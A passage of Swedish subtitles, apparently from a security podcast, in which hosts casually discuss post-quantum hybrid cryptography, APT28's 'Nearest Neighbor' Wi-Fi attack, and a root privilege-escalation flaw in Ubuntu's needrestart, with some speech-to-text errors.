`273 00:10:08,000 --> 00:10:10,480`
Vi har tagit alla lösenord,



`274 00:10:10,860 --> 00:10:12,240`
alla hemliga medlanden.



`275 00:10:12,420 --> 00:10:14,320`
Jag läste dem i klartext under månaden.



`276 00:10:14,460 --> 00:10:15,500`
It's inevitable.



`277 00:10:15,960 --> 00:10:17,640`
Det hjälper liksom inte om ni går till någon annan app.



`278 00:10:17,640 --> 00:10:18,760`
Vi kommer ta er igen.



`279 00:10:19,200 --> 00:10:20,400`
Men det är ju sjukt spännande



`280 00:10:20,400 --> 00:10:21,400`
när vi har de här problemen.



`281 00:10:21,400 --> 00:10:23,560`
När både Google och



`282 00:10:23,560 --> 00:10:25,840`
vad heter de?



`283 00:10:26,220 --> 00:10:27,940`
Apples-grunkar.



`284 00:10:27,980 --> 00:10:29,560`
De har sina forward-secrets



`285 00:10:29,560 --> 00:10:31,520`
och sina backward-secrets i hela kittet.



`286 00:10:32,240 --> 00:10:34,320`
Och så kommer de här då



`287 00:10:34,320 --> 00:10:36,220`
som antar inte



`288 00:10:36,220 --> 00:10:38,680`
att se till mot folk som har en extrem hotbild



`289 00:10:38,680 --> 00:10:40,240`
och fuckar upp



`290 00:10:40,240 --> 00:10:42,760`
själva idén.



`291 00:10:43,860 --> 00:10:45,400`
Men det är ju för att de inte kan krypto.



`292 00:10:46,500 --> 00:10:47,800`
Ja, men det kanske är så.



`293 00:10:47,820 --> 00:10:50,200`
Det är lättare att få kryptoexperter till äpplet



`294 00:10:50,200 --> 00:10:52,100`
än till crimeware.com.



`295 00:10:52,540 --> 00:10:53,960`
Jag tror de har lyssnat på vårt



`296 00:10:53,960 --> 00:10:55,640`
andra avsnitt.



`297 00:10:56,220 --> 00:10:57,860`
Och insett att monokultur är inte bra.



`298 00:10:58,200 --> 00:10:59,360`
Ja, ja, ja.



`299 00:11:00,860 --> 00:11:01,940`
Det här avsnittet kommer om två veckor.



`300 00:11:01,940 --> 00:11:03,520`
Men då är ju problemet



`301 00:11:03,520 --> 00:11:06,580`
att de har samma app och samma protokoll



`302 00:11:06,580 --> 00:11:07,180`
två användare.



`303 00:11:07,300 --> 00:11:09,980`
Om bara Johan hade sin



`304 00:11:09,980 --> 00:11:12,400`
Crime A-app och jag hade min



`305 00:11:12,400 --> 00:11:14,840`
Crime B-app och de var inkompatibla



`306 00:11:14,840 --> 00:11:16,500`
då hade vi inte haft monokultur.



`307 00:11:16,820 --> 00:11:18,280`
Sen hade vi inte kunnat kommunicera.



`308 00:11:18,360 --> 00:11:19,820`
De hade ju då



`309 00:11:19,820 --> 00:11:22,160`
Matrix, Matrix, TotalSec



`310 00:11:22,160 --> 00:11:24,380`
X-Quantum



`311 00:11:24,380 --> 00:11:26,020`
Q-Safe. Det kanske var olika.



`312 00:11:26,220 --> 00:11:26,960`
Just det, kan det vara.



`313 00:11:28,120 --> 00:11:29,600`
Fast samma back-end.



`314 00:11:29,760 --> 00:11:31,380`
Men om vi börjar snacka.



`315 00:11:31,720 --> 00:11:34,340`
Vi gör att Johans app får ha



`316 00:11:34,340 --> 00:11:35,600`
en kvant där.



`317 00:11:36,220 --> 00:11:37,760`
Och så har jag en Quantum Intang.



`318 00:11:37,860 --> 00:11:40,740`
Det menar jag inte med att min app har en Quantum Intang.



`319 00:11:40,760 --> 00:11:42,540`
Fast om vi löser vi det



`320 00:11:42,540 --> 00:11:44,620`
så tror jag inte vi behöver tjäna pengar på kriminella.



`321 00:11:46,620 --> 00:11:48,120`
Du menar att min kvant



`322 00:11:48,120 --> 00:11:50,100`
kommunikation har andra ljuscaser?



`323 00:11:50,120 --> 00:11:50,460`
Kanske.



`324 00:11:50,460 --> 00:11:52,620`
Men hojta



`325 00:11:52,620 --> 00:11:53,420`
om du löser det.



`326 00:11:53,980 --> 00:11:55,320`
För då vill jag investera.



`327 00:11:56,220 --> 00:11:58,060`
Minns ni den där kvant



`328 00:11:58,060 --> 00:12:00,860`
kvantkryptogrunkan



`329 00:12:00,860 --> 00:12:02,900`
som vi pratade om tidigt.



`330 00:12:03,160 --> 00:12:05,160`
Det var någon som blev så arg på oss



`331 00:12:05,160 --> 00:12:06,440`
för att vi hade sagt negativt



`332 00:12:06,440 --> 00:12:07,700`
och den där lastarna grejen.



`333 00:12:09,760 --> 00:12:10,900`
Hur många år sedan har det gått?



`334 00:12:11,000 --> 00:12:11,660`
Är det fem år sedan?



`335 00:12:12,020 --> 00:12:13,040`
Det var ett tag sedan.



`336 00:12:14,060 --> 00:12:15,220`
Ja, det finns folk till allt.



`337 00:12:15,480 --> 00:12:18,280`
Det dyker ju upp nya sådana märkliga rapporter



`338 00:12:18,280 --> 00:12:20,080`
om Quantum Safe



`339 00:12:20,080 --> 00:12:22,100`
networking och sånt.



`340 00:12:22,200 --> 00:12:23,240`
Var och en vecka tycker jag.



`341 00:12:23,500 --> 00:12:24,540`
Jag tänkte på det.



`342 00:12:26,220 --> 00:12:29,060`
Nu sneglar vi iväg på ett sidospår igen



`343 00:12:29,060 --> 00:12:30,260`
men det här med



`344 00:12:30,260 --> 00:12:32,880`
Quantum Safe



`345 00:12:32,880 --> 00:12:33,800`
Cryptography



`346 00:12:33,800 --> 00:12:35,960`
och jag tror att



`347 00:12:35,960 --> 00:12:38,380`
flera av dem har ju



`348 00:12:38,380 --> 00:12:40,500`
visat sig sårbara mot vanlig



`349 00:12:40,500 --> 00:12:41,760`
kryptoanalys.



`350 00:12:42,460 --> 00:12:44,760`
Inte utav de som har gått igenom NISTS-tävlingar nu va?



`351 00:12:45,160 --> 00:12:45,640`
Möjligen.



`352 00:12:45,840 --> 00:12:47,960`
Det sorterades ut ett par under tiden.



`353 00:12:48,100 --> 00:12:48,840`
Det gjorde det definitivt.



`354 00:12:49,080 --> 00:12:51,680`
Jag tänker det här med scare tactics



`355 00:12:51,680 --> 00:12:54,400`
att nu måste man ha Quantum Safe Cryptography



`356 00:12:54,400 --> 00:12:55,940`
för att vara säker.



`357 00:12:56,220 --> 00:12:56,660`
Men



`358 00:12:56,660 --> 00:13:01,420`
motargument är ju att



`359 00:13:01,420 --> 00:13:04,100`
flera har ju implementerat



`360 00:13:04,100 --> 00:13:04,580`
hybrid



`361 00:13:04,580 --> 00:13:07,740`
så att du har både klassisk och



`362 00:13:07,740 --> 00:13:09,780`
Quantum Secrets säkerhet



`363 00:13:09,780 --> 00:13:11,920`
och så mixar du dem med någon



`364 00:13:11,920 --> 00:13:13,780`
liten fin hash-markup



`365 00:13:13,780 --> 00:13:15,640`
så att



`366 00:13:15,640 --> 00:13:18,080`
även om någon bryter



`367 00:13:18,080 --> 00:13:19,660`
dina kvantar så ska



`368 00:13:19,660 --> 00:13:21,940`
klassisk säkerhet



`369 00:13:21,940 --> 00:13:22,800`
fortfarande rädda dig.



`370 00:13:22,800 --> 00:13:23,980`
Och det är väl just därför att



`371 00:13:23,980 --> 00:13:26,180`
de här nya protokollerna, även om de



`372 00:13:26,220 --> 00:13:28,060`
har gått igenom hela NISTS-tävlingar



`373 00:13:28,060 --> 00:13:30,260`
och så vidare så är de ändå relativt nya



`374 00:13:30,260 --> 00:13:30,840`
och otestade.



`375 00:13:31,620 --> 00:13:34,640`
Så därför väljer folk att köra en hybrid-variant.



`376 00:13:35,100 --> 00:13:36,000`
Jo, Kim



`377 00:13:36,000 --> 00:13:37,860`
Strömbergson



`378 00:13:37,860 --> 00:13:40,200`
skrev en artikel just om att



`379 00:13:40,200 --> 00:13:41,820`
vi närmar oss något



`380 00:13:41,820 --> 00:13:43,340`
datum för



`381 00:13:43,340 --> 00:13:46,180`
AES kommer vara riktigt gammal



`382 00:13:46,180 --> 00:13:48,040`
snart. Även om det fortfarande känns



`383 00:13:48,040 --> 00:13:50,000`
vakt ny så är den



`384 00:13:50,000 --> 00:13:50,860`
riktigt gammal.



`385 00:13:50,860 --> 00:13:52,780`
AES fyllde 20 år häromveckan.



`386 00:13:53,660 --> 00:13:56,140`
Han pekade också på



`387 00:13:56,140 --> 00:13:57,940`
en artikel från just NISTS



`388 00:13:57,940 --> 00:13:59,420`
faktiskt om hur de tycker att



`389 00:13:59,420 --> 00:14:00,600`
transitionen ska gå till



`390 00:14:00,600 --> 00:14:03,460`
från klassisk krypto till



`391 00:14:03,460 --> 00:14:04,960`
postkantum krypto då.



`392 00:14:05,380 --> 00:14:07,280`
Och jag har för mig, nu har inte jag läst den här rapporten



`393 00:14:07,280 --> 00:14:09,640`
men jag har för mig att de har hintat tidigare att de vill ju inte



`394 00:14:09,640 --> 00:14:10,820`
gå via hybrid-steget.



`395 00:14:11,340 --> 00:14:13,760`
De tycker det är extra arbete och extra komplexitet



`396 00:14:13,760 --> 00:14:15,520`
och så vidare. Men tittar du på faktiska



`397 00:14:15,520 --> 00:14:17,760`
implementationer idag som Apple har gjort till exempel



`398 00:14:17,760 --> 00:14:19,400`
då kör ju de hybrid-steget



`399 00:14:19,400 --> 00:14:21,300`
just bara för att de är lite nervösa för det här.



`400 00:14:21,900 --> 00:14:23,620`
Så att, det är intressant



`401 00:14:23,620 --> 00:14:25,420`
att läsa den här rapporten. Ett så kallat



`402 00:14:25,420 --> 00:14:25,820`
sidospår.



`403 00:14:26,140 --> 00:14:27,940`
Mm. Ja, har vi något mer



`404 00:14:27,940 --> 00:14:28,480`
att säga om Matrix?



`405 00:14:29,480 --> 00:14:31,700`
Det är coola telefoner och coola appar.



`406 00:14:32,260 --> 00:14:33,880`
Men inte så coolt



`407 00:14:33,880 --> 00:14:35,700`
att vara bo. Då gäller det att ta



`408 00:14:35,700 --> 00:14:37,880`
telefonsamtalet innan bilen



`409 00:14:37,880 --> 00:14:39,580`
kör in i det. Ja, vi kommer



`410 00:14:39,580 --> 00:14:41,720`
att pusha för Peters



`411 00:14:41,720 --> 00:14:43,200`
crime-app när den är klar.



`412 00:14:44,960 --> 00:14:45,900`
Men då kan jag



`413 00:14:45,900 --> 00:14:47,920`
ta och gå vidare här för det är



`414 00:14:47,920 --> 00:14:49,580`
jag tänkte prata lite



`415 00:14:49,580 --> 00:14:51,720`
om livet som



`416 00:14:51,720 --> 00:14:53,760`
rysk spion. Oj\!



`417 00:14:53,760 --> 00:14:55,440`
Ja, eller agent



`418 00:14:55,440 --> 00:14:56,020`
skulle man väl säga.



`419 00:14:56,140 --> 00:14:58,400`
Det är ju som bekant



`420 00:14:58,400 --> 00:15:00,080`
jobbigt att vara GRU-agent



`421 00:15:00,080 --> 00:15:01,520`
ibland. Okej.



`422 00:15:01,840 --> 00:15:04,240`
När man har bestämt är det jobbigt om man är



`423 00:15:04,240 --> 00:15:05,840`
det i Nederländerna



`424 00:15:05,840 --> 00:15:07,660`
2018. Okej.



`425 00:15:07,820 --> 00:15:10,260`
För då har man nämligen fått från Putin



`426 00:15:10,260 --> 00:15:12,240`
att ni måste ju hacka er in på



`427 00:15:12,240 --> 00:15:14,220`
Organization for the Prohibition of



`428 00:15:14,220 --> 00:15:16,000`
Chemical Weapons. Okej.



`429 00:15:16,280 --> 00:15:17,380`
För att påverka dem då lite.



`430 00:15:17,760 --> 00:15:19,680`
Ja, eller jag tror att de ville ha reda på



`431 00:15:19,680 --> 00:15:21,760`
information om Ukraina bland annat.



`432 00:15:22,020 --> 00:15:22,920`
Och sånt där. Okej.



`433 00:15:23,540 --> 00:15:25,420`
Det var ju framsynt. Men



`434 00:15:25,420 --> 00:15:25,480`
det var ju så att det var en del av det.



`435 00:15:25,480 --> 00:15:26,780`
Men det var ju bara det att



`436 00:15:26,780 --> 00:15:29,160`
vi måste ju bryta oss in här, tänker man då.



`437 00:15:29,300 --> 00:15:31,280`
Så vi sätter oss med våran stora



`438 00:15:31,280 --> 00:15:33,660`
hela wifi-antenn i baksättet



`439 00:15:33,660 --> 00:15:35,660`
och så parkerar vi oss utanför



`440 00:15:35,660 --> 00:15:37,480`
kontoret i Nederländerna.



`441 00:15:38,600 --> 00:15:38,880`
Och då



`442 00:15:38,880 --> 00:15:40,920`
blev de... Och där sitter de än.



`443 00:15:41,140 --> 00:15:43,300`
Ja, kan man säga. De blev gripna så det är



`444 00:15:43,300 --> 00:15:44,300`
small om det. Jaha.



`445 00:15:45,460 --> 00:15:47,300`
Förbjudet att ha wifi-antenn i baksättet?



`446 00:15:47,320 --> 00:15:48,440`
Förbjudet att hacka



`447 00:15:48,440 --> 00:15:51,180`
Chemical Warfare-organisationer.



`448 00:15:51,260 --> 00:15:51,720`
Okej, ja.



`449 00:15:52,720 --> 00:15:53,780`
Så det var



`450 00:15:53,780 --> 00:15:55,440`
en problembild då som GRU hade.



`451 00:15:55,480 --> 00:15:57,660`
Att det här med... När det krävs



`452 00:15:57,660 --> 00:15:59,340`
någon form av fysisk access



`453 00:15:59,340 --> 00:16:01,180`
då måste man ofta vara fysiskt nära någonstans.



`454 00:16:02,740 --> 00:16:03,660`
Men det har



`455 00:16:03,660 --> 00:16:04,940`
de nu tagit sig runt.



`456 00:16:05,200 --> 00:16:07,540`
Så bra. Så att nu kan de sitta hemma



`457 00:16:07,540 --> 00:16:08,580`
i soffan i Moskva



`458 00:16:08,580 --> 00:16:11,500`
och hacka saker fysiskt på andra



`459 00:16:11,500 --> 00:16:12,820`
sidan jorden. De använder



`460 00:16:12,820 --> 00:16:15,480`
magi och...



`461 00:16:16,340 --> 00:16:17,220`
Förnimmar...



`462 00:16:17,220 --> 00:16:18,480`
Quantum entanglement.



`463 00:16:20,020 --> 00:16:21,700`
Astralprojektion. Astralprojektion



`464 00:16:21,700 --> 00:16:23,360`
låter bra. Det här är någonting



`465 00:16:23,360 --> 00:16:25,320`
som släpptes på



`466 00:16:25,320 --> 00:16:27,540`
Cyberwarcon Security Conference



`467 00:16:27,540 --> 00:16:29,280`
här i veckan



`468 00:16:29,280 --> 00:16:31,300`
av Steven Adair



`469 00:16:31,300 --> 00:16:33,240`
från hans firma Volexity.



`470 00:16:34,540 --> 00:16:35,200`
De har



`471 00:16:35,200 --> 00:16:37,560`
nämligen stött på ett case



`472 00:16:37,560 --> 00:16:38,320`
där



`473 00:16:38,320 --> 00:16:41,000`
GRU eller APT...



`474 00:16:41,000 --> 00:16:43,380`
Vad heter de nu? APT28



`475 00:16:43,380 --> 00:16:45,280`
också kända som Fancy Bear



`476 00:16:45,280 --> 00:16:47,900`
lyckades



`477 00:16:47,900 --> 00:16:49,400`
göra en attack



`478 00:16:49,400 --> 00:16:51,320`
som de kallar för The Nearest Neighbor



`479 00:16:51,320 --> 00:16:53,380`
Attack. Det var nämligen



`480 00:16:53,380 --> 00:16:55,200`
så att en onämnd kund



`481 00:16:55,200 --> 00:16:56,220`
till Volexity då



`482 00:16:56,220 --> 00:16:58,340`
fick ett angrepp.



`483 00:16:59,040 --> 00:17:01,200`
Och de kunde inte lista ut varifrån



`484 00:17:01,200 --> 00:17:03,240`
det angreppet kom. De insåg



`485 00:17:03,240 --> 00:17:05,020`
att de har tagit sig in



`486 00:17:05,020 --> 00:17:07,280`
i våra system. De har gjort



`487 00:17:07,280 --> 00:17:09,220`
det över wifi men vi fattar



`488 00:17:09,220 --> 00:17:10,500`
inte riktigt var. Finns det några



`489 00:17:10,500 --> 00:17:12,080`
smittade



`490 00:17:12,080 --> 00:17:15,420`
smarta



`491 00:17:15,420 --> 00:17:17,240`
tv-apparater eller andra grejer



`492 00:17:17,240 --> 00:17:19,160`
routrar någonting sånt. De gick runt



`493 00:17:19,160 --> 00:17:21,360`
överallt och letade och kollade och försökte ta reda



`494 00:17:21,360 --> 00:17:22,460`
på var fan det här kom ifrån.



`495 00:17:23,580 --> 00:17:25,160`
Och gjorde en massa forensiska analyser.



`496 00:17:25,200 --> 00:17:26,960`
Och till slut så visade det sig att



`497 00:17:26,960 --> 00:17:29,300`
nätverket som hade



`498 00:17:29,300 --> 00:17:30,840`
anslutit till deras



`499 00:17:30,840 --> 00:17:33,500`
eller enheten som hade anslutit till deras nätverk



`500 00:17:33,500 --> 00:17:35,220`
den läckte vilket



`501 00:17:35,220 --> 00:17:37,380`
vilken domän den var ansluten till.



`502 00:17:38,440 --> 00:17:39,080`
Alltså typ AD.



`503 00:17:39,980 --> 00:17:41,240`
Och det namnet



`504 00:17:41,240 --> 00:17:43,320`
kände de igen för det var ju företaget på andra sidan



`505 00:17:43,320 --> 00:17:43,660`
gatan.



`506 00:17:45,080 --> 00:17:47,560`
Och då visade det sig att



`507 00:17:47,560 --> 00:17:49,100`
GRU hade



`508 00:17:49,100 --> 00:17:51,220`
helt enkelt hackat en



`509 00:17:51,220 --> 00:17:53,180`
laptop som stod på kontoret



`510 00:17:53,180 --> 00:17:55,080`
på andra sidan gatan. Den laptopen var



`511 00:17:55,200 --> 00:17:56,900`
ansluten till en docka så den var ansluten med



`512 00:17:56,900 --> 00:17:59,220`
Ethernet. Och sen hade dom använt



`513 00:17:59,220 --> 00:18:00,640`
den laptopens wifi-kort.



`514 00:18:00,660 --> 00:18:03,160`
Enabla till wifi-kortet. För att sedan



`515 00:18:03,160 --> 00:18:05,300`
attackera målet



`516 00:18:05,300 --> 00:18:07,300`
då som var på andra sidan gatan. Finurligt.



`517 00:18:07,860 --> 00:18:09,240`
Och förmodligen så var det ju inga



`518 00:18:09,240 --> 00:18:11,360`
avancerade attacker i det sista steget



`519 00:18:11,360 --> 00:18:12,700`
där utan där tror jag att det var



`520 00:18:12,700 --> 00:18:15,260`
någon form av credentials som dom redan hade fått.



`521 00:18:15,360 --> 00:18:17,340`
Men som krävde



`522 00:18:17,340 --> 00:18:19,420`
då fysiskt närvaro i wifi-et.



`523 00:18:20,980 --> 00:18:23,140`
Men det visade sig sen då när dom kollade



`524 00:18:23,140 --> 00:18:25,120`
närmare på detta att förmodligen så är det så



`525 00:18:25,200 --> 00:18:26,680`
att dom hade behövt



`526 00:18:26,680 --> 00:18:29,080`
hacka två, tre,



`527 00:18:29,460 --> 00:18:31,540`
fyra olika devices på vägen



`528 00:18:31,540 --> 00:18:32,760`
för att hoppa



`529 00:18:32,760 --> 00:18:35,140`
fram tills dom kom till en laptop som



`530 00:18:35,140 --> 00:18:37,420`
låg tillräckligt nära det wifi-nätverket



`531 00:18:37,420 --> 00:18:38,300`
som dom ville vara på.



`532 00:18:39,580 --> 00:18:40,800`
Fan vilka latmaskar dom är.



`533 00:18:40,940 --> 00:18:43,200`
Med sin Moskva-soffa istället



`534 00:18:43,200 --> 00:18:44,280`
för att ta sig till platsen.



`535 00:18:45,020 --> 00:18:47,240`
Men det är ju rätt smart. Och det gjorde ju också



`536 00:18:47,240 --> 00:18:49,180`
att det var ganska svårt att bli av



`537 00:18:49,180 --> 00:18:51,040`
med dom. För dom behövde ju egentligen



`538 00:18:51,040 --> 00:18:52,800`
inte bry sig om ifall dom blev upptäckta.



`539 00:18:52,940 --> 00:18:55,080`
Även om dom var effektiva på att sopa i en



`540 00:18:55,080 --> 00:18:55,740`
spåren efter sig.



`541 00:18:56,840 --> 00:18:58,940`
För, ja, vad ska du göra? Vem ska du gå och gripa?



`542 00:18:59,300 --> 00:19:00,700`
Ja, du får gå långt.



`543 00:19:00,900 --> 00:19:02,820`
Ja. Så att dom var



`544 00:19:02,820 --> 00:19:05,080`
väldigt persistent, sa han



`545 00:19:05,080 --> 00:19:06,060`
där.



`546 00:19:07,960 --> 00:19:09,480`
Not so advanced



`547 00:19:09,480 --> 00:19:10,840`
but very persistent.



`548 00:19:10,900 --> 00:19:11,720`
Förr i tiden så



`549 00:19:11,720 --> 00:19:15,180`
riktade man väl pringelsburkar



`550 00:19:15,180 --> 00:19:15,960`
mot fönstren.



`551 00:19:16,960 --> 00:19:19,500`
Men nu behövde du ju ändå en fysisk närvaro



`552 00:19:19,500 --> 00:19:21,080`
vilket dom har kommit bort från här då



`553 00:19:21,080 --> 00:19:23,320`
i och med att dom hoppar



`554 00:19:23,320 --> 00:19:24,660`
via grannarna istället.



`555 00:19:25,080 --> 00:19:25,740`
Ja, precis.



`556 00:19:26,520 --> 00:19:28,840`
Du kan ha ryssar i repot



`557 00:19:28,840 --> 00:19:30,440`
även om dom inte ens är fysisk närvaro.



`558 00:19:30,460 --> 00:19:32,700`
Men om vi bara fyller fönstren



`559 00:19:32,700 --> 00:19:34,920`
med bly så har vi löst en del



`560 00:19:34,920 --> 00:19:36,920`
av problematiken. Vi sätter bly



`561 00:19:36,920 --> 00:19:38,980`
lite överallt och så blir det väldigt nyttigt.



`562 00:19:39,120 --> 00:19:40,120`
Vi kan stänga av wifi.



`563 00:19:40,360 --> 00:19:43,280`
Jag tänkte ju säga, kablar for the win.



`564 00:19:45,280 --> 00:19:46,860`
Precis. Så att det var



`565 00:19:46,860 --> 00:19:48,580`
en ganska kort nyhet men lite intressant.



`566 00:19:48,700 --> 00:19:49,960`
En ny typ av attack.



`567 00:19:51,500 --> 00:19:51,740`
Mm.



`568 00:19:51,740 --> 00:19:53,760`
Då kommer vi tillbaka till



`569 00:19:53,760 --> 00:19:54,660`
cabling security.



`570 00:19:55,080 --> 00:19:58,500`
Lite utanför vad man brukar



`571 00:19:58,500 --> 00:19:59,360`
tänka på kan man säga.



`572 00:20:00,380 --> 00:20:01,860`
Har ni någon gång känt att



`573 00:20:01,860 --> 00:20:04,440`
det kanske vore gött att starta om datorn?



`574 00:20:05,400 --> 00:20:06,660`
Ja, gjorde det så sent som idag.



`575 00:20:07,060 --> 00:20:07,220`
Ja.



`576 00:20:08,600 --> 00:20:10,660`
Bunty, dom fixade ju



`577 00:20:10,660 --> 00:20:11,900`
ett program som



`578 00:20:11,900 --> 00:20:14,320`
berättar för dig om du borde starta om



`579 00:20:14,320 --> 00:20:14,800`
datorn.



`580 00:20:16,480 --> 00:20:20,220`
den gör ju det på en annan basis



`581 00:20:20,220 --> 00:20:21,800`
än att bara liksom så här



`582 00:20:21,800 --> 00:20:23,720`
eh



`583 00:20:23,720 --> 00:20:26,240`
man kunde ju ha så här att man bara



`584 00:20:26,240 --> 00:20:27,940`
säger till dig att du borde starta om datorn



`585 00:20:27,940 --> 00:20:29,860`
om det är en torsdag eller så men den gör det istället



`586 00:20:29,860 --> 00:20:32,160`
bara så här bara att du kör



`587 00:20:32,160 --> 00:20:33,200`
uppdateringar



`588 00:20:33,200 --> 00:20:36,080`
och så finns det ett program som heter



`589 00:20:36,080 --> 00:20:38,080`
Nits restart. Jag tror



`590 00:20:38,080 --> 00:20:40,300`
det är nästan bara Ubuntu som kör det här



`591 00:20:40,300 --> 00:20:41,780`
men Ubuntu har ganska många användare.



`592 00:20:42,340 --> 00:20:43,140`
Det är i varje fall många



`593 00:20:43,140 --> 00:20:46,180`
Ubuntu-inspirerade distros



`594 00:20:46,180 --> 00:20:47,740`
och sånt som kör Nits restart och



`595 00:20:47,740 --> 00:20:50,140`
vad den gör är att



`596 00:20:50,140 --> 00:20:50,500`
den



`597 00:20:50,500 --> 00:20:52,460`
skannar



`598 00:20:52,460 --> 00:20:54,560`
alla pågående processer



`599 00:20:54,560 --> 00:20:56,500`
så den körs ju med root och är lite



`600 00:20:56,500 --> 00:20:58,720`
gud permissions. Så skannar



`601 00:20:58,720 --> 00:21:00,180`
den alla processer som är igång



`602 00:21:00,180 --> 00:21:02,900`
och så berättar den om processerna



`603 00:21:02,900 --> 00:21:04,940`
och har någon mjukvara som är



`604 00:21:04,940 --> 00:21:08,860`
så man gör en sårbar version av någonting



`605 00:21:08,860 --> 00:21:10,980`
och finns det



`606 00:21:10,980 --> 00:21:12,560`
någonting som körs som är sårbart



`607 00:21:12,560 --> 00:21:14,580`
så rekommenderar den att man botar om datorn.



`608 00:21:16,420 --> 00:21:18,840`
Du kan ju också försöka starta



`609 00:21:18,840 --> 00:21:20,460`
om exakt de grejerna som



`610 00:21:20,500 --> 00:21:22,520`
behövs men ofta är det ju enklare att bara starta



`611 00:21:22,520 --> 00:21:23,060`
om datorn.



`612 00:21:25,880 --> 00:21:26,660`
Men vad är det



`613 00:21:26,660 --> 00:21:28,080`
alltså så om man kan säga att



`614 00:21:28,080 --> 00:21:30,200`
för att göra vad



`615 00:21:30,200 --> 00:21:32,320`
Nins restart görs, vad



`616 00:21:32,320 --> 00:21:33,940`
är det egentligen man behöver?



`617 00:21:35,060 --> 00:21:35,740`
Du behöver alltså



`618 00:21:35,740 --> 00:21:38,540`
som root på något



`619 00:21:38,540 --> 00:21:40,200`
sätt få veta vad



`620 00:21:40,200 --> 00:21:42,520`
vad



`621 00:21:42,520 --> 00:21:44,580`
vad



`622 00:21:44,580 --> 00:21:46,120`
vad klienterna



`623 00:21:46,120 --> 00:21:48,460`
Ja,



`624 00:21:48,460 --> 00:21:50,480`
vi har ett skönsätt ljud här



`625 00:21:50,500 --> 00:21:52,500`
och Mattias gör miner vilket är



`626 00:21:52,500 --> 00:21:54,600`
helt, men som root men vi får



`627 00:21:54,600 --> 00:21:56,940`
veta vad user space kör för mjukvara



`628 00:21:56,940 --> 00:21:59,120`
och



`629 00:21:59,120 --> 00:22:00,840`
det implementerade



`630 00:22:00,840 --> 00:22:02,480`
man helt trasigt på något sätt



`631 00:22:02,480 --> 00:22:04,640`
så att man skannade



`632 00:22:04,640 --> 00:22:06,340`
igenom här och så läste man in



`633 00:22:06,340 --> 00:22:08,100`
jag kommer inte ihåg om det var någon



`634 00:22:08,100 --> 00:22:09,900`
variable eller någonting



`635 00:22:09,900 --> 00:22:12,440`
där och så lyckades man få det helt



`636 00:22:12,440 --> 00:22:14,240`
sårbart så att man



`637 00:22:14,240 --> 00:22:16,680`
user space kunde bestämma



`638 00:22:16,680 --> 00:22:18,840`
vilken kod som skulle exekvera



`639 00:22:18,840 --> 00:22:20,360`
i root space.



`640 00:22:20,500 --> 00:22:22,620`
Så det är ju inte så lyckat.



`641 00:22:22,620 --> 00:22:23,680`
Typiskt dåligt.



`642 00:22:24,840 --> 00:22:26,560`
Och så det



`643 00:22:26,560 --> 00:22:28,420`
fanns en brutal feldesign i



`644 00:22:28,420 --> 00:22:30,460`
Nins restart och den designen



`645 00:22:30,460 --> 00:22:31,600`
har legat där i



`646 00:22:31,600 --> 00:22:34,180`
över tio år innan



`647 00:22:34,180 --> 00:22:36,300`
någon har hittat den här så Ubuntu



`648 00:22:36,300 --> 00:22:37,700`
baserade maskiner har



`649 00:22:37,700 --> 00:22:40,540`
vem som helst kunnat ta över



`650 00:22:40,540 --> 00:22:42,500`
med ett relativt



`651 00:22:42,500 --> 00:22:44,240`
enkelt, relativt straight forward



`652 00:22:44,240 --> 00:22:46,520`
SUV till



`653 00:22:46,520 --> 00:22:47,960`
root Pwnage



`654 00:22:47,960 --> 00:22:50,340`
som har legat här och



`655 00:22:50,500 --> 00:22:52,440`
ja, har du bara



`656 00:22:52,440 --> 00:22:53,900`
känt till den har det varit enkelt



`657 00:22:53,900 --> 00:22:55,240`
det blir otroligt länge.



`658 00:22:56,180 --> 00:22:57,740`
Så om du kör Ubuntu, starta om.



`659 00:22:58,620 --> 00:22:59,940`
You need to restart.



`660 00:23:00,040 --> 00:23:02,740`
Det roligaste med detta tycker jag är att ett av de stora argumenten



`661 00:23:02,740 --> 00:23:04,580`
back in the day när man var cool



`662 00:23:04,580 --> 00:23:06,380`
Linux user och inte ville använda Windows



`663 00:23:06,380 --> 00:23:08,340`
var att Windows var ju så supertöntigt



`664 00:23:08,340 --> 00:23:10,240`
för man ville starta om så fort det fanns en uppdatering



`665 00:23:10,240 --> 00:23:12,480`
medan i Linux så var det bara update



`666 00:23:12,480 --> 00:23:14,420`
så var det klart liksom. Och nu finns det



`667 00:23:14,420 --> 00:23:16,560`
alltså då ett program som typ



`668 00:23:16,560 --> 00:23:18,360`
nästan gör Windows emuleringar



`669 00:23:18,360 --> 00:23:20,360`
i perspektivet så. Känns ju supertöntigt.



`670 00:23:20,500 --> 00:23:22,460`
Supertöntigt. Och tillför en snygg



`671 00:23:22,460 --> 00:23:23,020`
privväsk.



`672 00:23:25,540 --> 00:23:26,440`
Låter ju också som



`673 00:23:26,440 --> 00:23:27,440`
Windows. Ja, i och för sig.



`674 00:23:28,340 --> 00:23:30,860`
Run as root. Jag vet inte om du



`675 00:23:30,860 --> 00:23:32,060`
är högre upp i



`676 00:23:32,060 --> 00:23:32,980`
eller liksom



`677 00:23:32,980 --> 00:23:36,340`
högt upp i värdekedjan så borde du ju bara kunna



`678 00:23:36,340 --> 00:23:38,440`
bota om eller döda alla processer som



`679 00:23:38,440 --> 00:23:40,360`
sådär. Men det är väl förmodligen



`680 00:23:40,360 --> 00:23:42,320`
det att man vill vara lite snäll och att allting



`681 00:23:42,320 --> 00:23:43,960`
inte hänger ihop designmässigt.



`682 00:23:44,760 --> 00:23:46,080`
Det är ju miljontals olika



`683 00:23:46,080 --> 00:23:48,060`
utvecklare som har



`684 00:23:48,060 --> 00:23:49,140`
slängt ihop Linux.



`685 00:23:50,500 --> 00:23:51,240`
Tror det att.



`686 00:23:52,740 --> 00:23:54,600`
Alright. Credential guard.



`687 00:23:54,600 --> 00:23:56,520`
Ja, vi byter



`688 00:23:56,520 --> 00:23:57,200`
till



`689 00:23:57,200 --> 00:23:59,080`
pyttermjuk.



`690 00:24:02,000 --> 00:24:02,860`
Det var



`691 00:24:02,860 --> 00:24:04,900`
några pentester som jag tror



`692 00:24:04,900 --> 00:24:06,460`
det var för sans som man har skrivit



`693 00:24:06,460 --> 00:24:08,520`
eller så som de gjorde



`694 00:24:08,520 --> 00:24:10,640`
ett pentest och så körde de sina



`695 00:24:10,640 --> 00:24:12,960`
coola Windows



`696 00:24:12,960 --> 00:24:14,880`
hackgrejer som alltid funkar



`697 00:24:14,880 --> 00:24:15,520`
och



`698 00:24:15,520 --> 00:24:18,020`
helt plötsligt funkade de inte.



`699 00:24:18,280 --> 00:24:20,440`
Och de såhär, oh, vad har det hänt?



`700 00:24:20,440 --> 00:24:21,900`
